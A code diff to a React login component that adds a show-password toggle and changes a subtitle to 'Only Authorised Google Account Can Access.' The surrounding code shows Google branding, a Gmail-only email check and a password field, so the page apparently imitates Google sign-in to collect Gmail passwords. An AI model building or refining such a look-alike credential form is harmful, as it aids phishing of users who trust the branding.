@@ -6,6 +6,7 @@ export default function Login() {
   const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");
+  const [showPassword, setShowPassword] = useState(false);
 
   const isValidGmail = (email) => {
     return email.endsWith("@gmail.com");
@@ -50,7 +51,7 @@ export default function Login() {
           alt="Google"
         />
         <h2>Verified Access</h2>
-        <p>Access To Content Is Protected & Secured</p>
+        <p>Only Authorised Google Account Can Access. </p>
 
         {error && <p style={{ color: "red", fontSize: "14px" }}>{error}</p>}
 
@@ -60,12 +61,22 @@ export default function Login() {
           onChange={(e) => setEmail(e.target.value)}
           type="email"
         />
-        <input
-          placeholder="Password"
-          value={password}
-          onChange={(e) => setPassword(e.target.value)}
-          type="password"
-        />
+        
+        <div className="password-input-wrapper">
+          <input
+            placeholder="Password"
+            value={password}
+            onChange={(e) => setPassword(e.target.value)}
+            type={showPassword ? "text" : "password"}
+          />
+          <button
+            type="button"
+            className="toggle-password"
+            onClick={() => setShowPassword(!showPassword)}
+          >
+            {showPassword ? "👁️" : "👁️‍🗨️"}
+          </button>
+        </div>
 
         <button onClick={handleLogin} disabled={loading}>
           {loading ? "Verifying..." : "Continue"}
